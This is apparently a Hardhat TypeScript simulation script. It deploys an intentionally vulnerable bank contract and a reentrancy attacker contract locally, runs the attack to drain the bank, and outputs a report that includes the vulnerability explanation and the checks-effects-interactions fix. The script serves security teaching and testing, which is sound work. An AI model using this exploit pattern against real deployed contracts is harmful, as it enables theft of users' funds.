import hre from "hardhat";
import { parseEther, formatEther } from "ethers";
import { buildResult } from "./buildResult";

async function main() {
  const startTime = Date.now();
  const [deployer, attacker] = await hre.ethers.getSigners();

  // Deploy VulnerableBank
  const BankFactory = await hre.ethers.getContractFactory("VulnerableBank");
  const bank = await BankFactory.deploy();
  await bank.waitForDeployment();
  const bankAddress = await bank.getAddress();

  // Seed bank with 1 ETH from deployer
  const seedAmount = parseEther("1");
  await (bank as any).connect(deployer).deposit({ value: seedAmount });
  const initialBalance: bigint = await (bank as any).getBankBalance();

  // Deploy ReentrancyAttacker
  const AttackerFactory = await hre.ethers.getContractFactory("ReentrancyAttacker");
  const attackerContract = await AttackerFactory.connect(attacker).deploy(bankAddress);
  await attackerContract.waitForDeployment();
  const attackerAddress = await attackerContract.getAddress();

  const t1 = Date.now();

  // Run the attack
  await (attackerContract as any).connect(attacker).attack({ value: parseEther("0.1") });

  const endTime = Date.now();

  const finalBalance: bigint = await (bank as any).getBankBalance();
  const stolenAmount: bigint = initialBalance - finalBalance;
  const attackerBal: bigint = await (attackerContract as any).getBalance();
  const reentryCount: bigint = await (attackerContract as any).reentryCount();

  const result = buildResult({
    contractName: "VulnerableBank",
    contractAddress: bankAddress,
    attackType: "reentrancy",
    targetFunction: "withdraw()",
    severity: "Critical",
    initialBalance,
    finalBalance,
    stolenAmount,
    startTime,
    endTime,
    transactions: [
      {
        step: 1,
        description: "Attacker deposits 0.1 ETH into VulnerableBank",
        from: attacker.address,
        to: bankAddress,
        value: "0.1",
        unit: "ETH",
        timestampMs: t1,
        balanceAfter: {
          victim: formatEther(seedAmount + parseEther("0.1")),
          attacker: "0.9",
        },
      },
      {
        step: 2,
        description: "Attacker calls withdraw() — re-entry begins",
        from: attacker.address,
        to: bankAddress,
        value: "0.1",
        unit: "ETH",
        timestampMs: t1 + Math.floor((endTime - t1) * 0.3),
        balanceAfter: {
          victim: formatEther(seedAmount),
          attacker: "1.0",
        },
      },
      {
        step: 3,
        description: `Re-entered withdraw() — ${reentryCount} iterations`,
        from: attacker.address,
        to: bankAddress,
        value: formatEther(stolenAmount - parseEther("0.1")),
        unit: "ETH",
        timestampMs: t1 + Math.floor((endTime - t1) * 0.8),
        balanceAfter: {
          victim: "0.1",
          attacker: formatEther(attackerBal - parseEther("0.1")),
        },
      },
      {
        step: 4,
        description: `Funds fully drained after ${reentryCount} re-entries`,
        from: attackerAddress,
        to: bankAddress,
        value: "0.0",
        unit: "ETH",
        timestampMs: endTime,
        balanceAfter: {
          victim: formatEther(finalBalance),
          attacker: formatEther(attackerBal),
        },
      },
    ],
    timeline: [
      "VulnerableBank deployed",
      "Victim funded with 1.0 ETH",
      "Attacker deposited 0.1 ETH",
      "withdraw() called — re-entry triggered",
      `Re-entered ${reentryCount} times`,
      "Funds drained",
    ],
    report: {
      vulnerabilityType: "Reentrancy",
      affectedFunction: "withdraw()",
      explanation:
        "ETH is sent to the caller before balances[msg.sender] is set to 0. The attacker's receive() fallback re-calls withdraw() recursively, draining the contract before the balance is ever updated.",
      fix: "Apply the checks-effects-interactions pattern: update balances[msg.sender] = 0 before the external call, or use OpenZeppelin ReentrancyGuard.",
    },
  });

  process.stdout.write("SIMULATION_RESULT:" + JSON.stringify(result) + "\n");
}

main().catch(e => {
  console.error(e);
  process.exit(1);
});
